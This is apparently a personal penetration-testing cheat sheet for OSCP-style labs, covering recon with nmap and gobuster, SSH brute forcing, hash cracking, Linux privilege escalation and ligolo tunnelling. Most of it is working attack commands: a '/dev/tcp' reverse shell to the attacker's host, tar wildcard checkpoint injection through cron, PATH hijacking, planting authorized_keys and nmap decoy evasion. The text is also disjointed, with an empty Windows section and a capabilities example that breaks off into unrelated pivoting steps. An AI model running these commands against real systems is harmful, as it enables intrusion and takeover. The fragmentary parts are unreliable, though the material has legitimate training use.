Prep & Misc

Every engagement

Housekeeping before you touch a target: fix the VPN MTU, know how to connect over RDP, and compile payloads that will run on the box.

Housekeeping (VPN setup)

# BEFORE STARTING ANYTHING: fix the VPN MTU
$ sudo ifconfig tun0 mtu 1250

RDP Connection

# RDP (rdesktop)
$ rdesktop -u localuser -p passwd -r disk:shared=/tmp 192.168.235.199
$ rdesktop -u domainuser -p passwd -d offsec.exam -r disk:shared=/tmp 192.168.235.199

Compiling C Files

# When compiling C scripts, if "gcc" is not on the target machine, we can compile the script locally with the --static flag, and then transfer the compiled file to the target (typically for Windows)
$ x86_64-w64-mingw32-gcc --static -o shell.exe nc_revshell.c
# Compiling shared libraries (.so files):
$ gcc -shared -fPIC -o shared.so shell.c -Wl,--export-dynamic

Recon & Enumeration

Map everything first

Enumerate hard before exploiting. Sweep ports, fingerprint services, then drill each one — web paths, SMB/FTP/LDAP/SNMP/SMTP/IMAP, databases, and exposed git.

Web Server Path Enumeration

Gobuster
$ gobuster dir -u http://192.168.69.69 -w /usr/share/dirb/wordlists/raft-medium-directories.txt
# If nothing shows up, include extensions and run again:
$ gobuster dir -u http://192.168.69.69 -w /usr/share/dirb/wordlists/raft-medium-directories.txt -x php,txt,html
# When scanning for subdirectories, also check the path http://192.168.69.69/<machine_name> (might reveal a secret path)
# Wordlist order: common.txt -> raft-medium-directories.txt -> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Nmap Scanning

# Scan the network range for valid IPs:
$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
# Scanning all ports:
$ sudo nmap -p- -Pn -v 192.168.69.69 -sS -A -T4
$ sudo nmap -n -sT -p- -T5 192.168.69.69
# TCP-SYN scan:
$ sudo nmap -sS 192.168.69.69
# UDP port scan:
$ sudo nmap -sU -p161 192.168.69.69
# Note: The more common and relevant UDP ports are 53 (DNS), 69 (TFTP), 161 (SNMP)
# Scanning with a script:
$ sudo nmap 10.129.24.28 -p 80 -sV --script vuln
# Where "vuln" is a script category
# Other categories include "default", "exploit", "safe", "discovery" etc.
$ sudo nmap 10.129.69.69 -sV -A (runs all default scripts)
# Firewall evasion (not really under OSCP):
# SYN scan (-sS):
$ sudo nmap 10.129.2.28 -p21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace
# ACK scan (-sA):
$ sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
# Decoys (-D):
# Disguises the origin of the packet sent
$ sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
# "-D RND:5" = generate five random IP address that indicate the source IP
# DNS proxying (--source-port 53):
$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53

Initial Access & Web

Get the first foothold

Turn a service into a shell: work login pages and default creds, chase public exploits, abuse file inclusion, and pivot through SSH.

Initial Access Vectors

For websites, our enumeration methodology should be:

  1. If there is a login page, try using default creds to get to an admin panel of some sort.
  2. If default creds don't work, is there a password reset page, or a register page?
  3. If none of the above work, try SQLi.
  4. If the service is non-standard, look up public exploits (Google, or searchsploit <keyword>).
  5. Enumerate paths using gobuster and repeat the above steps for each interesting path:
$ gobuster dir -u http://192.168.69.69 -w /usr/share/dirb/wordlists/raft-medium-directories.txt
  1. If the above fails, enumerate other ports/services before continuing.

SSH Shit

# NMAP bruteforce (100% blind):
$ nmap -p22 --script=/usr/share/nmap/scripts/ssh-brute.nse 192.168.169.69
# Hydra bruteforce (if we know usernames and/or passwords):
$ sudo hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.169.69
Creating + Uploading a New Identity File to Login
  1. Generate the keypair: ssh-keygen
  2. Upload the public key (id_rsa.pub) to the target.
  3. If the authorized_keys file exists, add the public key to it. We can also potentially replace the authorized_keys file by renaming our key.pub file to "authorized_keys" and uploading it.
  4. Set correct permissions for the private key: chmod 600 id_rsa
  5. Now we can login using the private key.

Miscellaneous
  • Check for backend scripts — are there any vulnerabilities in them?
  • For public exploits involving request.get() calls, add verify=False to each one to avoid connection errors.
    • Exploit scripts often reach the target over HTTPS, and if the box uses a self-signed or otherwise invalid TLS certificate, Python's requests library aborts the connection — verify=False skips that certificate check so the request goes through.

Password Cracking

Note: Check if the password is simply base64 encoded before attempting to crack it.
# Telltale sign: It looks something like VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
$ echo <base64 string> | base64 -d
JohnTheRipper
# Crack a password hash:
$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
# To extract password-protected ZIP files:
$ zip2john file.zip > hashes.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# Then use the resultant password to extract the ZIP
# To extract SSH keys' passphrases:
$ ssh2john id_rsa > ssh.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
Hashcat
# Identify the hashcat mode to use:
$ hashid -m '<HASH>'
# Crack the hash with that mode:
$ sudo hashcat -m 400 pass.txt /usr/share/wordlists/rockyou.txt --force

Password Spraying

# hosts.txt is a list of IP addresses
$ nxc smb ./hosts.txt -u users.txt -p pass.txt

Low priv → SYSTEM

Enumerate the host, then escalate: service-binary swaps, token-impersonation potatoes, SeDebug/SeBackup abuse, installer and DNS misconfigs.

Windows Enumeration

Linux: Enum & Privesc

Low priv → root

Walk the low-hanging fruit first (sudo -l, SUID, cron, writable files), then the group and capability routes to root.

Linux Enumeration

# Check the sudo version (older versions have public exploits):
$ sudo -v
# Kernel and OS version — look up kernel exploits on searchsploit:
$ uname -a
# Current user, UID and group memberships (lxd / docker / adm / disk open privesc routes):
$ id
# Listening TCP/UDP ports and the processes behind them (internal services to pivot to):
$ ss -ntplu
# SQL databases: look for local DBs and reuse any creds found in app/web config files
# Find listening DB ports (3306 MySQL / 5432 Postgres / 1433 MSSQL / 27017 Mongo):
$ ss -ntlp | grep -E '3306|5432|1433|27017'
# Hunt for DB creds in app/web config files:
$ grep -rniE 'db_pass|password|connectionstring' /var/www 2>/dev/null
# Manual file enumeration: if nothing turns up in common locations, check /opt.
# Start from the directory where the foothold was gained, then work outwards.
$ ls -la /opt
pspy (Live Process Monitoring)

Watch processes and cron jobs in real time without root — pspy catches short-lived commands run by root (hidden cron jobs, scheduled tasks) that enumeration scripts miss, often revealing the privesc path.

# Transfer pspy to the target, then watch (print commands + file events, 1s interval):
$ ./pspy64 -pf -i 1000

PATH Abuse
# Condition: a SUID (or otherwise privileged) binary must invoke another program by name rather than by absolute path. The system then searches $PATH, so a malicious binary of the same name placed earlier in PATH runs with that privileged binary's rights.
 
# Example usage:
# Add "/tmp" to the user's PATH:
$ export PATH=/tmp:$PATH
 
# Create a command in the /tmp directory that does something else instead:
$ echo "/bin/bash" > /tmp/cat
$ chmod 755 /tmp/cat
 
# Now when "cat" is executed, a shell should be spawned
# If this fake "cat" is executed by root, we will get a root shell
# Normally, we look for files that have an SUID bit and perform this hack on irregular SUID files
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
Wildcard Abuse (via cronjobs)
# This can be used if we find a cronjob that looks something like:
# */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
# The important bit being the "*" at the end
 
# We can leverage the wildcard to run bash files:
$ echo "" > '--checkpoint=1'
$ echo "" > '--checkpoint-action=exec=sh poop.sh'
$ echo "sh -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1" > poop.sh
$ chmod 755 poop.sh
# If the reverse shell doesn't work, here are some alternatives:

Capabilities
# When capabilities are set for a binary, it means that it will be able to perform specific actions that would otherwise not be possible
# Important examples:
# "cap_sys_admin" = allows to perform actions with admin privileges
# "cap_setuid" = allows a process to set its effective user ID
# "cap_setgid" = allows a process to set its effective group ID
# "cap_dac_override" = allows bypassing of file read, write, and execute permission checks
# Enumerating capabilities:
$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
# Example exploitation of "cap_dac_override":
# Suppose enumeration reveals that "/usr/bin/vim.basic" has the "cap_dac_override" capability

# Step 1. In the terminal, create and bring up the tun interface:
$ sudo ip tuntap add user kali mode tun ligolo
$ sudo ip link set ligolo up
# Note that we need to clean up afterwards using:
$ sudo ip link delete ligolo

# On Kali:
$ ligolo-proxy -selfcert
# On the target (11601 is ligolo's default proxy port):
$ ./ligolo-agent.exe -connect <KALI_IP>:11601 -ignore-cert
 
# Step 3. Within the ligolo CLI, pick the session, then start it:
$ session
$ start
 
# Step 4. Route the remote subnet through the tunnel (run in Kali terminal):
$ sudo ip route add 172.16.69.0/24 dev ligolo
 
# For the target's own localhost ports, route the magic ligolo IP instead:
# Use this when a service is bound only to 127.0.0.1 on the target (e.g. an internal admin panel or DB on loopback) — then connect to 240.0.0.5:<port> from Kali to reach it
$ sudo ip route add 240.0.0.5/32 dev ligolo
 
# Step 5. Add a listener (on ligolo CLI):
$ listener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT>
# This redirects traffic hitting <PORT> on all agent interfaces (0.0.0.0) to <PORT> on Kali (127.0.0.1)
